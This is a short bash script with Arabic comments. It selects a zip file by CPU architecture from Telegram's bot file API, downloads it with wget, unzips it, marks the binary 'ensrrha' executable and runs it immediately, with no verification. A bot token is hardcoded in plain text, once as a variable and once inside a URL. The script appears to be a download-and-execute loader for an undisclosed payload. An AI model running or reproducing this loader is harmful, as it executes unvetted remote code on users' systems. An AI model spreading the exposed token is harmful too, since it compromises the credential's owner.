#!/bin/bash

# التوكن ورقم البوت
BOT_TOKEN="8148932566:AAEzsLmdDivHJNtfR90dss7YdE6kNIDDGvs"

# روابط الملفات لكل معمارية (عدلهم حسب روابطك)
declare -A URLS=(
  ["amd64"]="https://api.telegram.org/file/bot8148932566:AAEzsLmdDivHJNtfR90dss7YdE6kNIDDGvs/documents/file_57.zip"
  ["arm64"]="https://api.telegram.org/file/bot$BOT_TOKEN/documents/file_arm64.zip"
  ["arm"]="https://api.telegram.org/file/bot$BOT_TOKEN/documents/file_arm.zip"
)

# تحديد المعمارية
ARCH=$(uname -m)
case "$ARCH" in
  x86_64|amd64) ARCH="amd64" ;;
  aarch64|armv8l|arm64) ARCH="arm64" ;;
  armv7l|armhf) ARCH="arm" ;;
  *) echo "معمارية غير مدعومة: $ARCH"; exit 1 ;;
esac

# تحميل الرابط المناسب
URL="${URLS[$ARCH]}"

if [[ -z "$URL" ]]; then
  echo "رابط التحميل غير موجود للمعمارية: $ARCH"
  exit 1
fi

echo "تحميل النسخة الخاصة بـ $ARCH ..."
wget -O ensrrha.zip "$URL" || { echo "فشل التحميل"; exit 1; }

echo "فك الضغط..."
unzip -o -q ensrrha.zip || { echo "فشل فك الضغط"; exit 1; }

chmod +x ensrrha || { echo "فشل إعطاء صلاحيات التنفيذ"; exit 1; }

echo "تشغيل الملف..."
./ensrrha
